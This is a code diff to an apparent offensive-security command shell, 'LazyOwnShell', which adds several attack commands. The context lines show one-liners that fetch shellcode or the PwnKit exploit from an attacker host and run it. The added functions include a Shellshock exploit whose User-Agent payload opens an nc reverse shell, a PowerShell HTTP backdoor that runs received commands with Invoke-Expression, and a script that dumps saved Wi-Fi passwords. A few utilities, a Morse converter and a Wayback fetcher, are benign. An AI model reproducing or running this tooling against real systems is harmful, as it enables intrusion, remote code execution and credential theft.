@@ -4585,6 +4585,7 @@ class LazyOwnShell(Cmd):
             ("find .bash_history files in current dir", "find . -type f -name .bash_history"),
             ("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
             ("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
+            ("Timers", "systemctl list-timers"),
             ("python", "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"),
             ("python shellcode.bin", f'python3 -c "import base64, ctypes, urllib.request; url = \'http://{lhost}/shellcode.bin\'; response = urllib.request.urlopen(url); shellcode = base64.b64decode(response.read()); shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode)); shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p)); shellcode_func()"'),
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
@@ -7986,6 +7987,301 @@ class LazyOwnShell(Cmd):
         copy2clip(command)
         os.system(command)
         return
+        
+    def do_smalldic(self, list):
+        """
+        Handles the creation of temporary files for users and passwords based on a small dictionary.
+
+        This function prompts the user to decide whether to use a small dictionary for generating 
+        user and password lists. If the user agrees, it loads the credentials from a JSON file and 
+        writes them into temporary files. If the user declines, the process is aborted.
+
+        Parameters:
+        list (str): Not used in this function, but kept for compatibility with cmd command input.
+
+        Returns:
+        None
+        """        
+        use_small_dict = input(f"    {CYAN}[?] Do you want to use the small dictionary? (yes/no): ").strip().lower()
+
+        if use_small_dict == "yes":
+            path = os.getcwd()
+            smalldic = f"{path}/modules/credentials.json"
+            with open(smalldic, 'r') as f:
+                data = json.load(f)
+            
+            print_msg("Create temporary files for users")
+            with open('sessions/small_users.txt', 'w') as f:
+                for username in data["usernames"]:
+                    if username:
+                        f.write(username + '\n')
+            print_msg("Create temporary files for passwords")
+            with open('sessions/small_passwords.txt', 'w') as f:
+                for password in data["passwords"]:
+                    if password:
+                        f.write(password + '\n')
+            print_msg("Done.")
+        else:
+            print_warn("Abort. smalldic")
+        return
+
+    def do_ngrok(self, line):
+        """
+        Set up and run ngrok on a specified local port. If ngrok is not installed, it will
+        automatically be installed. The user will be prompted to provide their ngrok
+        authentication token to complete the setup.
+
+        Args:
+            line (str): The input line, though it's not directly used in this function.
+
+        Workflow:
+        1. Check if the local port specified in `self.params["lport"]` is valid.
+        2. Verify if ngrok is installed. If not, proceed with installation.
+        3. After installation, prompt the user to authenticate ngrok using their token.
+        4. Once authenticated, run ngrok to expose the specified local port.
+
+        Note:
+            The ngrok authentication token can be obtained from the ngrok dashboard.
+        """
+        lport = self.params["lport"]
+        if not check_lport(lport):
+            return
+        if not is_binary_present("ngrok"):
+            print_warn("Installing ngrok")
+            install = """
+            curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \                                                                       ─╯
+                | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
+                && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
+                | sudo tee /etc/apt/sources.list.d/ngrok.list \
+                && sudo apt update \
+                && sudo apt install ngrok
+            """
+            print_msg(install)
+            os.system(install)
+            
+            print_msg("visit https://dashboard.ngrok.com/get-started/your-authtoken to get your token")
+            token = input("    [!] Authenticate your ngrok agent with your Token:")
+            install = "ngrok config add-authtoken"
+            command = f"{install} {token}"
+            print_msg(command)
+            choice = input("    [?] is it correct ? (yes/no)")
+            if choice == "yes":
+                os.system(command)
+                print_msg("Done")
+            else:
+                print_warn("Exiting...")
+                return
+        command = f"ngrok http http://localhost:{lport}"
+        print_msg(f"Try... {command}")
+        os.system(command)
+        return
+
+    def do_wifipass(self, line):
+        """
+        This function generates a PowerShell script that retrieves saved Wi-Fi passwords on a Windows system.
+        The script gathers the Wi-Fi profiles, extracts their passwords, and saves the information in a text file
+        named 'wifi_passwords.txt' in the directory where the script is executed. The generated PowerShell command
+        is copied to the clipboard for easy execution.
+
+        Parameters:
+        line (str): This parameter is not used within the function but is required for the command interface.
+
+        The function does not return any value.
+        """
+        command = '''
+        $currentDir = Get-Location
+        $networks = netsh wlan show profiles
+        $networkNames = $networks | Select-String -Pattern '(?:Perfil\s*:\s)(.*)' | ForEach-Object { $_.Matches[0].Groups[1].Value }
+        $results = @()
+        foreach ($networkName in $networkNames) {
+            $command = 'netsh wlan show profile "' + $networkName + '" key=clear'
+            $currentResult = Invoke-Expression $command
+            $results += $currentResult
+        }
+        $result = $results -join "`n"
+        $outputFile = Join-Path $currentDir "wifi_passwords.txt"
+        $result | Out-File -FilePath $outputFile -Encoding utf8
+        Write-Host "Wi-Fi passwords saved to $outputFile"'''.replace("        ",'')
+        copy2clip(command)
+        return
+
+    def do_shellshock(self, line):
+        """
+        Executes a Shellshock attack against a target.
+
+        This function constructs and sends a specially crafted HTTP request designed to exploit 
+        the Shellshock vulnerability on a target server. The payload is embedded in the 
+        'User-Agent' header, and when executed, it will open a reverse shell connection to 
+        the attacker's machine.
+
+        Parameters:
+        - lport: Local port for the reverse shell connection, retrieved from self.params.
+        - lhost: Local host for the reverse shell connection, retrieved from self.params.
+
+        The function first validates the local host (lhost) and local port (lport) using 
+        check_lhost() and check_lport(). If either validation fails, the function returns 
+        without proceeding.
+
+        If the validation passes, the payload is created using the format:
+        '() { :; }; /bin/bash -c "nc -v {rhost} {lport} -e /bin/bash -i"',
+        where rhost is the remote target's IP address and lport is the specified local port.
+
+        The function then attempts to send a GET request to the target URL (args.target) 
+        with the crafted payload in the 'User-Agent' header. The server's response is captured 
+        and printed using print_msg().
+
+        If any error occurs during the request, an error message is displayed using print_error().
+
+        Returns:
+        None
+        """
+        lport = self.params["lport"]
+        lhost = self.params["lhost"]
+        url = self.params["url"]
+        if not check_lhost(lhost):
+            return
+
+        if not check_lport(lport):
+            return
+
+        if not url:
+            print_error(f"use {GREEN}set url http://example.com {CYAN}to set url")
+            return
+
+        payload = '() {{ :; }}; /bin/bash -c "nc -v {} {} -e /bin/bash -i"'.format(lhost, lport)
+        print_msg(f"Constructed payload: {payload}")
+        try:
+            print_msg("Attacking {}".format(url))
+            headers = {"Content-type": "application/x-www-form-urlencoded",
+                    "User-Agent": payload}
+            req = requests.get(url, headers=headers).text
+            with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as output_file:
+                output_file.write(req.encode('utf-8'))  
+                temp_file_name = output_file.name  
+            subprocess.run(['batcat', temp_file_name])
+            os.remove(temp_file_name)
+        except KeyError as e:
+            print_error(f"KeyError: {e}")
+        except Exception as e:
+            print_error(f"An unexpected error occurred: {e}")
+        print_warn(f"Attack done, using headers: {headers}")
+        return
+
+    def do_powerserver(self, line):
+        """
+        This function generates a PowerShell script that retrieves reverse shell over http on a Windows system.
+        The script generated PowerShell reverse shell to execute command by curl command
+        is copied to the clipboard for easy execution.
+
+        Parameters:
+        line (str): This parameter is used to get the port to create the listener
+
+        The function does not return any value.
+        Example of use: curl -X POST http://victim:8080/ -d "Get-Process"
+        """
+        rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
+        if not line:
+            print_error("You need to specify the port, for example: powershell 5555.")
+            return
+        command = '''
+        $listener = New-Object System.Net.HttpListener
+
+        $listener.Prefixes.Add("http://*:8080/")
+
+        $listener.Start()
+        Write-Host "Servidor iniciado. Escuchando en http://*:8080/"
+
+        try {
+            while ($true) {
+                $context = $listener.GetContext()
+                $request = $context.Request
+                $response = $context.Response
+
+                $body = New-Object System.IO.StreamReader($request.InputStream)
+                $command = $body.ReadToEnd()
+                $body.Close()
+
+                try {
+                    $output = Invoke-Expression $command
+                    $response.StatusCode = 200
+                    $response.ContentType = "text/plain"
+                    $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
+                    $response.ContentLength64 = $outputBytes.Length
+                    $response.OutputStream.Write($outputBytes, 0, $outputBytes.Length)
+                } catch {
+                    $response.StatusCode = 500
+                    $errorMessage = $_.Exception.Message
+                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Error: $errorMessage"), 0, $errorMessage.Length)
+                }
+
+                $response.OutputStream.Close()
+            }
+        } catch {
+            Write-Host "Ocurrió un error: $_"
+        } finally {
+            $listener.Stop()
+        }
+        '''.replace("        ",'').replace("8080",line)
+        copy2clip(command)
+        
+        print_warn(f'Example of use: curl -X POST http://{rhost}:{line}/ -d "Get-Process"')
+        return
+
+    def do_morse(self,line):
+        """*********************** Welcome to Morse Code Convertor 🔄️ ***********************
+
+            		 1️⃣  to convert text to Morse code
+            		 2️⃣  to convert Morse code to text
+            		 0️⃣  to exit the program
+        *********************** End Morse Code Convertor 🔄️ ***********************                     
+        """
+        try:
+            os.system("python3 modules/morse.py")
+        except KeyboardInterrupt:
+            print_warn("Exiting...")
+
+    def do_waybackmachine(self, line):
+        """
+        Fetch URLs from the Wayback Machine for a given website.
+        The URL is taken from line. If the URL is not provided, an error is printed.
+        The limit of results is taken from self.params["limit"] if provided; otherwise, defaults to 10.
+        Results are printed directly to the console.
+        """
+        if not line:
+            print_error("you need pass the search keyword as argument")
+            return
+        url = line
+        limit = self.params.get("limit", 10)
+
+        # Constructing the request URL
+        wayback_url = (
+            f"https://web.archive.org/cdx/search?url={url}&matchType=prefix&collapse=urlkey&output=text&fl=original&filter=&limit={limit}"
+        )
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/68.0"
+        }
+        os.system("clear")
+        
+        try:
+            r = requests.get(wayback_url, headers=headers)
+            r.raise_for_status()
+            results = r.text
+         
+            
+
+            print_msg(f"{GREEN}############ All websites from the WayBack Machine ###########")
+
+            # Printing the results
+            for j, i in enumerate(results.split(), start=1):
+                print_msg(f"{j} : {i}")
+            print_msg(f"{CYAN}https://web.archive.org/web/*/{line}/*")
+            print_msg(f"{CYAN}############## Thanks for using LazyOwn! ###############")
+
+        except requests.exceptions.RequestException as e:
+            print_warn(f"Warning: Failed to fetch data from the Wayback Machine. {str(e)}")
 
 def xor_encrypt_decrypt(data, key):
     """XOR Encrypt or Decrypt data with a given key"""
